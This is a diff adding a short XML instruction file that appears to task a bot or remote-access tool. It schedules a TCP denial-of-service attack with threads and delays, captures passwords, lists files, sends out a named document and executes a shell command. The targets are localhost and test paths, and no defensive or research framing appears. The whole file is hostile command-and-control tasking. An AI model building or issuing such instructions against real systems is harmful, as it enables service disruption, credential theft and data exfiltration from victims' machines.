@@ -1,0 +1,16 @@
+﻿<?xml version="1.0" encoding="utf-8" ?>
+<Instructions>
+	<DoS Id="1" From = "2018-03-10 11:00" To ="2018-03-10 12:00" Delay="40" Times ="50" 
+		 Target="Tcp" Ip="127.0.0.1" Port="80" Threads="10" Minutes="2" 
+		 DelaySecondsBetweenAtacks="3"/>
+	<CapturePasswords Id="2" />
+	<ListFiles Id="3" />
+	<SendFile Id="4">
+		C:\Documents\Test.doc
+	</SendFile>
+	<Execute Id="4">
+		<Command>
+			copy c:\autoexec.bat c:\autoexec.bak
+		</Command>
+	</Execute>
+</Instructions>
